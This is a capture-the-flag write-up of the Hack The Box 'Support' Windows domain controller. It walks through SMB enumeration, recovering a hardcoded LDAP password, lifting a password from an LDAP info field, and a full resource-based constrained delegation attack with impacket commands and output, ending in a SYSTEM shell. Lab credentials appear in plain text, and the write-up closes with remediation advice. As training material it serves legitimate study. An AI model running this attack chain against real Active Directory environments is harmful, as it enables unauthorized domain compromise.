---
title: "HTB Support Writeup"
summary: "Windows writeup covering SMB enumeration, LDAP credential recovery, BloodHound analysis, and RBCD abuse."
date: 2026-06-06
tags:
  - htb
  - windows
  - active-directory
  - smb
  - rbcd
  - recon
category: "hack-the-box"
difficulty: "easy"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/833a3b1f7f96b5708d19b6de084c3201.png"
draft: false
---
## Challenge Information

|Field|Value|
|---|---|
|Machine|Support|
|Platform|Hack The Box|
|Difficulty|Easy|
|OS|Windows|
|Target IP|`[REDACTED_TARGET_IP]`|
|Domain|`support.htb`|
|DC Hostname|`dc.support.htb`|
|User|`support`|
|Root|`nt authority\system`|

---

## Summary

The Support machine exposed SMB shares on a Windows Domain Controller. One non-default share, `support-tools`, contained a custom binary named `UserInfo.exe.zip`. After extracting and reversing the binary, a hardcoded LDAP password was recovered.

The LDAP password allowed authenticated LDAP enumeration. The `support` domain user had a suspicious `info` attribute containing a valid password. That credential was then used to obtain a WinRM shell as `support`.

BloodHound analysis showed that the `support` user had `GenericAll` over the `DC.SUPPORT.HTB` computer object. This was abused through Resource-Based Constrained Delegation. A fake computer account was created, delegated to act on behalf of the Domain Controller, and used to impersonate `Administrator` for the CIFS service. Finally, Impacket `psexec` was used with the Kerberos ticket to obtain a SYSTEM shell and read the root flag.

---

## 1. Reconnaissance

The target was confirmed alive using ICMP.

```bash
ping [REDACTED_TARGET_IP]
```

Output showed successful replies:

```text
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=1 ttl=127 time=203 ms
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=2 ttl=127 time=191 ms
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=3 ttl=127 time=224 ms
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=4 ttl=127 time=186 ms
```

A full TCP scan can be performed with:

```bash
sudo nmap -Pn -n -p- --min-rate 5000 [REDACTED_TARGET_IP] -oN full_ports.txt
```

Then service/version detection:

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' full_ports.txt | paste -sd,)
sudo nmap -Pn -n -sCV -p "$ports" [REDACTED_TARGET_IP] -oN services.txt
```

Important exposed services on this machine include SMB, LDAP, Kerberos, DNS, RPC, and WinRM.

---

## 2. SMB Enumeration

SMB shares were enumerated.

```bash
smbclient -L //[REDACTED_TARGET_IP] -N
```

The machine exposed six SMB shares.

Important result:

```text
support-tools
```

This share stood out because it was not a default Windows Domain Controller share.

The share was accessed anonymously:

```bash
smbclient //[REDACTED_TARGET_IP]/support-tools -N
```

Files were listed:

```text
dir
```

Most files were public tools, but one custom file stood out:

```text
UserInfo.exe.zip
```

The file was downloaded:

```text
get UserInfo.exe.zip
```

---

## 3. Extracting the Custom Binary

The archive was extracted locally.

```bash
mkdir UserInfo
unzip UserInfo.exe.zip -d UserInfo
tree UserInfo
```

Extracted contents:

```text
UserInfo
├── CommandLineParser.dll
├── Microsoft.Bcl.AsyncInterfaces.dll
├── Microsoft.Extensions.DependencyInjection.Abstractions.dll
├── Microsoft.Extensions.DependencyInjection.dll
├── Microsoft.Extensions.Logging.Abstractions.dll
├── System.Buffers.dll
├── System.Memory.dll
├── System.Numerics.Vectors.dll
├── System.Runtime.CompilerServices.Unsafe.dll
├── System.Threading.Tasks.Extensions.dll
├── UserInfo.exe
├── UserInfo.exe.config
└── UserInfo.exe.zip
```

The important file was:

```text
UserInfo.exe
```

---

## 4. Reverse Engineering UserInfo.exe

The binary was analyzed with Ghidra / dnSpy / ILSpy-style .NET inspection.

A hardcoded encrypted LDAP password was discovered in the binary logic. The binary used a simple reversible encryption routine.

Recovered hardcoded LDAP password:

[REDACTED_PASSWORD]
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

This credential was used by the binary to query LDAP.

---

## 5. LDAP Enumeration

The recovered LDAP credential allowed LDAP access.

A useful way to query LDAP is with `ldapsearch`:

```bash
ldapsearch -x -H ldap://[REDACTED_TARGET_IP] \
-D 'support\ldap' \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'dc=support,dc=htb'
```

During LDAP enumeration, the `support` user had an interesting field:

```text
info
```

The `info` field contained a password-like value.

Recovered `support` user password:

[REDACTED_PASSWORD]
Ironside47pleasure40Watchful
```

---

## 6. WinRM Foothold

Port `5985` was open, which allowed PowerShell remoting through WinRM.

The `support` credential was tested with Evil-WinRM:

```bash
evil-winrm -i [REDACTED_TARGET_IP] -u support -p 'Ironside47pleasure40Watchful'
```

After login, the user flag could be read from the support user’s desktop.

```powershell
whoami
type C:\Users\support\Desktop\[REDACTED_FLAG_PATH]
```

The shell confirmed access as:

```text
support\support
```

---

## 7. BloodHound Enumeration

Active Directory data was collected for BloodHound.

```bash
bloodhound-python -u support \
-p 'Ironside47pleasure40Watchful' \
-d support.htb \
-ns [REDACTED_TARGET_IP] \
-c all
```

The generated JSON files were imported into BloodHound.

BloodHound showed that the `support` user had the following privilege over the Domain Controller object:

```text
GenericAll
```

Target object:

```text
DC.SUPPORT.HTB
```

This privilege allowed modification of the Domain Controller computer object. The attack path used was Resource-Based Constrained Delegation.

---

## 8. Preparing Kerberos Resolution

The hostnames were added to `/etc/hosts`.

```bash
echo "[REDACTED_TARGET_IP] support.htb dc.support.htb dc" | sudo tee -a /etc/hosts
```

Environment variables were set for cleaner command usage:

```bash
export DC=[REDACTED_TARGET_IP]
export DOMAIN=support.htb
export USER=support
export PASS='Ironside47pleasure40Watchful'
```

---

## 9. Creating a Fake Computer Account

Since normal domain users can often create machine accounts if `MachineAccountQuota` allows it, a fake computer account was created.

```bash
impacket-addcomputer "$DOMAIN/$USER:$PASS" \
-dc-ip $DC \
-computer-name 'G10D$' \
-computer-pass '[REDACTED_PASSWORD]'
```

Successful output:

```text
[*] Successfully added machine account G10D$ with password [REDACTED_PASSWORD].
```

---

## 10. Writing RBCD Rights

The fake computer account was granted permission to act on behalf of the Domain Controller.

```bash
impacket-rbcd "$DOMAIN/$USER:$PASS" \
-dc-ip $DC \
-delegate-from 'G10D$' \
-delegate-to 'DC$' \
-action write
```

Successful output:

```text
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] G10D$ can now impersonate users on DC$ via S4U2Proxy
```

This modified the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the `DC$` computer object.

---

## 11. Requesting an Administrator Service Ticket

A Kerberos service ticket was requested to impersonate `Administrator` for the CIFS service on the Domain Controller.

Before running `getST`, old Kerberos cache variables were cleared:

```bash
unset KRB5CCNAME
```

The ticket was requested:

```bash
impacket-getST 'support.htb/G10D$:[REDACTED_PASSWORD]' \
-dc-ip [REDACTED_TARGET_IP] \
-spn cifs/dc.support.htb \
-impersonate Administrator
```

Successful output:

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

The ticket was confirmed:

```bash
ls -la *.ccache
```

Output:

```text
Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

The Kerberos cache was exported:

```bash
export KRB5CCNAME="$(pwd)/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache"
klist
```

Output showed:

```text
Ticket cache: FILE:/home/kali/Desktop/Hack The Box/Machines/Support/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
Default principal: Administrator@support.htb

Valid starting       Expires              Service principal
06/05/2026 13:37:59  06/05/2026 23:37:58  cifs/dc.support.htb@SUPPORT.HTB
```

---

## 12. SYSTEM Shell with Impacket psexec

The Administrator CIFS ticket was used with Impacket `psexec`.

```bash
impacket-psexec -k -no-pass -dc-ip [REDACTED_TARGET_IP] dc.support.htb
```

Successful output:

```text
[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file iBbjKapD.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service tZUO on dc.support.htb.....
[*] Starting service tZUO.....
Microsoft Windows [Version 10.0.20348.859]
```

The shell was running as SYSTEM:

```cmd
whoami
```

Output:

```text
nt authority\system
```

---

## 13. Root Flag

The root flag was read from the Administrator desktop.

```cmd
type C:\Users\Administrator\Desktop\[REDACTED_FLAG_PATH]
```

Root flag:

```text
[REDACTED_HASH]
```

---

## 14. Attack Chain

```text
SMB enumeration
    ↓
support-tools share discovered
    ↓
UserInfo.exe.zip downloaded
    ↓
UserInfo.exe reversed
    ↓
Hardcoded LDAP password recovered
    ↓
LDAP enumeration
    ↓
support user password found in info field
    ↓
WinRM shell as support
    ↓
BloodHound collection
    ↓
support has GenericAll over DC.SUPPORT.HTB
    ↓
Fake computer account created
    ↓
RBCD written to DC$
    ↓
Administrator CIFS ticket requested
    ↓
psexec with Kerberos ticket
    ↓
SYSTEM shell
    ↓
[REDACTED_FLAG_PATH] read
```

---

## 15. Commands Used

### SMB

```bash
smbclient -L //[REDACTED_TARGET_IP] -N
smbclient //[REDACTED_TARGET_IP]/support-tools -N
```

### Binary Extraction

```bash
unzip UserInfo.exe.zip -d UserInfo
tree UserInfo
```

### LDAP

```bash
ldapsearch -x -H ldap://[REDACTED_TARGET_IP] \
-D 'support\ldap' \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'dc=support,dc=htb'
```

### WinRM

```bash
evil-winrm -i [REDACTED_TARGET_IP] -u support -p 'Ironside47pleasure40Watchful'
```

### BloodHound

```bash
bloodhound-python -u support \
-p 'Ironside47pleasure40Watchful' \
-d support.htb \
-ns [REDACTED_TARGET_IP] \
-c all
```

### RBCD Exploitation

```bash
echo "[REDACTED_TARGET_IP] support.htb dc.support.htb dc" | sudo tee -a /etc/hosts

impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' \
-dc-ip [REDACTED_TARGET_IP] \
-computer-name 'G10D$' \
-computer-pass '[REDACTED_PASSWORD]'

impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' \
-dc-ip [REDACTED_TARGET_IP] \
-delegate-from 'G10D$' \
-delegate-to 'DC$' \
-action write

unset KRB5CCNAME

impacket-getST 'support.htb/G10D$:[REDACTED_PASSWORD]' \
-dc-ip [REDACTED_TARGET_IP] \
-spn cifs/dc.support.htb \
-impersonate Administrator

export KRB5CCNAME="$(pwd)/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache"

impacket-psexec -k -no-pass -dc-ip [REDACTED_TARGET_IP] dc.support.htb
```

---

## 16. Issues Encountered

### Issue 1: Bash `dquote>` Prompt

While running `impacket-getST`, the shell entered:

```text
dquote>
```

This happened because of a broken or unclosed quote in the command.

Fix:

Use a single-line command:

```bash
impacket-getST 'support.htb/G10D$:[REDACTED_PASSWORD]' -dc-ip [REDACTED_TARGET_IP] -spn cifs/dc.support.htb -impersonate Administrator
```

---

### Issue 2: Wrong Kerberos Cache Filename

The generated ticket was not named `Administrator.ccache`.

Actual filename:

```text
Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Correct export:

```bash
export KRB5CCNAME="$(pwd)/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache"
```

---

### Issue 3: Windows Shell Commands

Inside the `psexec` shell, Linux commands such as `ls` do not work.

Incorrect:

```cmd
ls
ls -la
```

Correct:

```cmd
dir
type C:\Users\Administrator\Desktop\[REDACTED_FLAG_PATH]
```

---

## 17. Remediation

The following issues enabled compromise:

1. **Anonymous SMB access**

    - Restrict anonymous access to SMB shares.

    - Audit exposed shares and remove unnecessary public tools.

2. **Hardcoded LDAP password**

    - Never store credentials inside binaries.

    - Use managed service accounts or secure secret storage.

3. **Sensitive data in LDAP attributes**

    - Do not store passwords in fields such as `info`.

    - Audit LDAP attributes for secrets.

4. **Excessive Active Directory permissions**

    - Remove `GenericAll` from low-privileged users.

    - Regularly audit ACLs with BloodHound or equivalent tooling.

5. **MachineAccountQuota abuse**

    - Set `ms-DS-MachineAccountQuota` to `0` unless domain users need to join machines.

6. **RBCD abuse path**

    - Monitor changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`.

    - Alert on unexpected computer account creation and delegation changes.


---

## 18. Conclusion

The Support machine was compromised through weak internal configuration rather than a direct software exploit. Anonymous SMB access exposed a custom binary containing an LDAP credential. LDAP enumeration revealed the `support` user’s password inside the `info` field. After obtaining a WinRM shell, BloodHound showed that the `support` user had `GenericAll` over the Domain Controller object.

This permission was abused using Resource-Based Constrained Delegation. A fake computer account was created, configured to impersonate users against the Domain Controller, and used to request a CIFS service ticket as `Administrator`. With that ticket, Impacket `psexec` provided a shell as `nt authority\system`, allowing the root flag to be read.

Final root flag:

```text
[REDACTED_HASH]
```
